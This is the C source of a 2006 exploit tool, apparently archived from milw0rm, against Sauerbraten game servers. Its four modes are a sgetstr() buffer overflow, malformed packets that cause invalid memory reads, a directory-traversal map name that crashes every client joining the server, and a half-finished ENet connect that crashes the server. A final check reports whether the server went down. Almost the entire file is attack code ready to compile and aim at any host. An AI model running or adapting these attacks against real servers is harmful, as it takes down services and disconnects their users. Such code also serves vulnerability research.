<html><head><title>Sauerbraten <= 2006_02_28 Multiple BoF/Crash Vulnerabilities Exploit</title></head><pre>/*

by Luigi Auriemma

You NEED Enet for compiling this tool (then remember -lenet)
  http://enet.bespin.org / http://enet.cubik.org

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;enet/enet.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = &quot;Interrupted system call&quot;; break;
        case 10009: error = &quot;Bad file number&quot;; break;
        case 10013: error = &quot;Permission denied&quot;; break;
        case 10014: error = &quot;Bad address&quot;; break;
        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
        case 10024: error = &quot;Too many open files&quot;; break;
        case 10035: error = &quot;Operation would block&quot;; break;
        case 10036: error = &quot;Operation now in progress&quot;; break;
        case 10037: error = &quot;Operation already in progress&quot;; break;
        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
        case 10039: error = &quot;Destination address required&quot;; break;
        case 10040: error = &quot;Message too long&quot;; break;
        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
        case 10042: error = &quot;Bad protocol option&quot;; break;
        case 10043: error = &quot;Protocol not supported&quot;; break;
        case 10044: error = &quot;Socket type not supported&quot;; break;
        case 10045: error = &quot;Operation not supported on socket&quot;; break;
        case 10046: error = &quot;Protocol family not supported&quot;; break;
        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
        case 10048: error = &quot;Address already in use&quot;; break;
        case 10049: error = &quot;Can't assign requested address&quot;; break;
        case 10050: error = &quot;Network is down&quot;; break;
        case 10051: error = &quot;Network is unreachable&quot;; break;
        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
        case 10053: error = &quot;Software caused connection abort&quot;; break;
        case 10054: error = &quot;Connection reset by peer&quot;; break;
        case 10055: error = &quot;No buffer space available&quot;; break;
        case 10056: error = &quot;Socket is already connected&quot;; break;
        case 10057: error = &quot;Socket is not connected&quot;; break;
        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
        case 10059: error = &quot;Too many references, can't splice&quot;; break;
        case 10060: error = &quot;Connection timed out&quot;; break;
        case 10061: error = &quot;Connection refused&quot;; break;
        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
        case 10063: error = &quot;File name too long&quot;; break;
        case 10064: error = &quot;Host is down&quot;; break;
        case 10065: error = &quot;No Route to Host&quot;; break;
        case 10066: error = &quot;Directory not empty&quot;; break;
        case 10067: error = &quot;Too many processes&quot;; break;
        case 10068: error = &quot;Too many users&quot;; break;
        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
        case 10070: error = &quot;Stale NFS file handle&quot;; break;
        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
        case 11001: error = &quot;Host not found&quot;; break;
        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
    exit(1);
}

    #define close   closesocket
    #define ONESEC  1000
    #define MYRAND  clock()
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netinet/in.h&gt;
    #include &lt;netdb.h&gt;
    #include &lt;sys/times.h&gt;

    #define ONESEC  1
    #define MYRAND  times(0)
#endif



#define VER         &quot;0.1&quot;
#define PORT        28785
#define MAXTRANS    5000
#define BOFSZ       (MAXTRANS + 256)
#define MAPSUX      &quot;base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../base/../readme.txt&quot;



enum {
    SV_INITS2C = 0, SV_INITC2S, SV_POS, SV_TEXT, SV_SOUND, SV_CDIS,
    SV_DIED, SV_DAMAGE, SV_SHOT, SV_FRAGS,
    SV_MAPCHANGE, SV_ITEMSPAWN, SV_ITEMPICKUP, SV_DENIED,
    SV_PING, SV_PONG, SV_CLIENTPING, SV_GAMEMODE,
    SV_TIMEUP, SV_MAPRELOAD, SV_ITEMACC,
    SV_SERVMSG, SV_ITEMLIST, SV_RESUME, 
    SV_EDITENT, SV_EDITH, SV_EDITF, SV_EDITT, SV_EDITM, SV_FLIP, SV_ROTATE,
    SV_MASTERMODE, SV_KICK, SV_CURRENTMASTER,
};

void putint(u_char *p, int n, u_char **out) {
    if(n&lt;128 &amp;&amp; n&gt;-127) { *p++ = n; }
    else if(n&lt;0x8000 &amp;&amp; n&gt;=-0x8000) { *p++ = 0x80; *p++ = n; *p++ = n&gt;&gt;8;  }
    else { *p++ = 0x81; *p++ = n; *p++ = n&gt;&gt;8; *p++ = n&gt;&gt;16; *p++ = n&gt;&gt;24; };
    *out = p;
};

int getint(u_char *p, u_char **out) {
    int c = *((char *)p);
    p++;
    if(c==-128) { int n = *p++; n |= *((char *)p)&lt;&lt;8; p++; *out = p; return n;}
    else if(c==-127) { int n = *p++; n |= *p++&lt;&lt;8; n |= *p++&lt;&lt;16; *out = p; return n|(*p++&lt;&lt;24); } 
    else { *out = p; return c; }
};

void sendstring(char *t, u_char *p, u_char **out) {
    while(*t) putint(p, *t++, &amp;p);
    putint(p, 0, &amp;p);
    *out = p;
};



int build_enet_connect_boom(u_char *buff);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int timeout(int sock);
void std_err(void);



struct  sockaddr_in peers;



int main(int argc, char *argv[]) {
    ENetAddress address;
    ENetEvent   event;
    ENetPeer    *peer;
    ENetHost    *client;
    ENetPacket  *packet;
    int         len,
                i,
                attack;
    u_short     port = PORT;
    u_char      buff[8192],
                mybof[BOFSZ],
                *p;

    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Sauerbraten &lt;= 2006_02_28 multiple vulnerabilities &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@autistici.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 3) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;attack&gt; &lt;host&gt; [port(%hu)]\n&quot;
            &quot;\n&quot;
            &quot;Attack:\n&quot;
            &quot;1 = sgetstr() buffer-overflow\n&quot;
            &quot;2 = invalid memory access during data reading (getint and sgetstr)\n&quot;
            &quot;3 = crash of any client which will join the server through malformed map\n&quot;
            &quot;    loaded with directory traversal vulnerability and 260 bytes limit\n&quot;
            &quot;4 = crash due to unconnected client\n&quot;
            &quot;\n&quot;,
            argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(enet_initialize()) {
        printf(&quot;\nError: an error occurred while initializing ENet\n&quot;);
        exit(1);
    }

    client = enet_host_create(
        NULL        /* create a client host */,
        1           /* only allow 1 outgoing connection */,
        57600 / 8   /* 56K modem with 56 Kbps downstream bandwidth */,
        14400 / 8   /* 56K modem with 14 Kbps upstream bandwidth */);

    if(!client) {
        printf(&quot;An error occurred while trying to create an ENet client host.\n&quot;);
        exit(1);
    }

    if(argc &gt; 3) port = atoi(argv[3]);
    if(enet_address_set_host(&amp;address, argv[2]) &lt; 0) {
        address.host = inet_addr(argv[2]);
    }
    address.port         = port;

    peers.sin_addr.s_addr = address.host;
    peers.sin_port        = htons(address.port);
    peers.sin_family      = AF_INET;

    printf(&quot;- target   %s : %hu\n&quot;,
        inet_ntoa(*(struct in_addr *)&amp;address.host),
        address.port);

    peer = enet_host_connect(client, &amp;address, 2);    
    if(!peer) {
       printf(&quot;\nError: no peers available for initiating an ENet connection\n&quot;);
       exit(1);
    }

    if(attack == 4) {
        printf(&quot;- send Enet connect packet without continuing the connection\n&quot;);
        len = build_enet_connect_boom(buff);
        len = send_recv(client-&gt;socket, buff, len, buff, sizeof(buff), 1);
        printf(&quot;- the server should crash within one minute\n&quot;);
        for(i = 50; i; i--) {
            printf(&quot;%3d\b\b\b&quot;, i);
            sleep(ONESEC);
        }
        goto check;
    }

    printf(&quot;- connect...&quot;);
    if((enet_host_service(client, &amp;event, 5000) &gt; 0) &amp;&amp; (event.type == ENET_EVENT_TYPE_CONNECT)) {
        printf(&quot;ok\n&quot;);
    } else {
        printf(&quot;failed!\n&quot;);
        goto quit;
    }

    p = buff;
    if(attack == 1) {
        printf(
            &quot;- send buffer-overflow data (%d bytes)\n&quot;
            &quot;  note: if the server doesn't crash quickly retry again some times,\n&quot;
            &quot;        unfortunately don't know why this happens sometimes\n&quot;, BOFSZ);
        putint(p, SV_TEXT, &amp;p);
        memset(mybof, 'A', sizeof(mybof) - 1);
        mybof[sizeof(mybof) - 1] = 0;
        sendstring(mybof, p, &amp;p);

    } else if(attack == 2) {
        printf(&quot;- send incomplete data\n&quot;);
        putint(p, SV_INITC2S, &amp;p);
        // no sendstring and putint so the server
        // will crash due to invalid memory access

    } else if(attack == 3) {
        printf(&quot;- send bad map\n&quot;);
        putint(p, SV_MAPCHANGE, &amp;p);
        sendstring(MAPSUX, p, &amp;p);
        putint(p, 0, &amp;p);
    }

    packet = enet_packet_create(
        buff, 
        p - buff, 
        ENET_PACKET_FLAG_RELIABLE);

    enet_peer_send(peer, 0, packet);
    enet_host_flush(client);
    if((enet_host_service(client, &amp;event, 3000) &gt; 0) &amp;&amp;(event.type == ENET_EVENT_TYPE_RECEIVE)) {
        enet_packet_destroy(event.packet);
    }

    enet_peer_disconnect(peer);

    if(attack == 3) {
        printf(
            &quot;- if the server was empty the map has been accepted\n&quot;
            &quot;  any client which will join the server will exit immediately\n&quot;);
        goto quit;
    }

check:
    printf(&quot;- check server:\n&quot;);
    if(enet_host_service(client, &amp;event, 5000) &gt; 0) {
        printf(&quot;\n  Server does not seem vulnerable\n\n&quot;);
    } else {
        printf(&quot;\n  Server IS vulnerable!!!\n\n&quot;);
    }

    enet_peer_disconnect(peer);

quit:
    enet_peer_reset(peer);
    enet_deinitialize();
    return(0);
}



int build_enet_connect_boom(u_char *buff) {
    ENetProtocolHeader  *header;
    ENetProtocol        *command;
    u_int   chall,
            stime;

    header  = (ENetProtocolHeader *)buff;
    command = (ENetProtocol *)(buff + sizeof(ENetProtocolHeader));

    stime = MYRAND;
    chall = ~stime;

    header-&gt;peerID                              = htons(0xffff);
    header-&gt;flags                               = 0;
    header-&gt;commandCount                        = 1;
    header-&gt;sentTime                            = stime;
    header-&gt;challenge                           = chall;

    command-&gt;header.command                     = ENET_PROTOCOL_COMMAND_CONNECT;
    command-&gt;header.channelID                   = 0xff;
    command-&gt;header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
    command-&gt;header.reserved                    = 0;
    command-&gt;header.commandLength               = htonl(sizeof(ENetProtocolConnect));
    command-&gt;header.reliableSequenceNumber      = htonl(1);

    command-&gt;connect.outgoingPeerID             = htons(0);
    command-&gt;connect.mtu                        = htons(1400);
    command-&gt;connect.windowSize                 = htonl(32768);
    command-&gt;connect.channelCount               = htonl(ENET_PROTOCOL_MAXIMUM_CHANNEL_COUNT);
    command-&gt;connect.incomingBandwidth          = htonl(0);
    command-&gt;connect.outgoingBandwidth          = htonl(0);
    command-&gt;connect.packetThrottleInterval     = htonl(5000);
    command-&gt;connect.packetThrottleAcceleration = htonl(2);
    command-&gt;connect.packetThrottleDeceleration = htonl(2);

    return(sizeof(ENetProtocolCommandHeader) + sizeof(ENetProtocolConnect));
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    for(retry = 3; retry; retry--) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)&amp;peers, sizeof(peers))
          &lt; 0) std_err();
        if(!timeout(sd)) break;
    }

    if(!retry) {
        if(!err) return(-1);
        fputs(&quot;\nError: socket timeout, no reply received\n\n&quot;, stdout);
        exit(1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len &lt; 0) std_err();
    return(len);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = 1;
    tout.tv_usec = 0;
    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
    if(err &lt; 0) std_err();
    if(!err) return(-1);
    return(0);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif

// milw0rm.com [2006-03-06]</pre></html>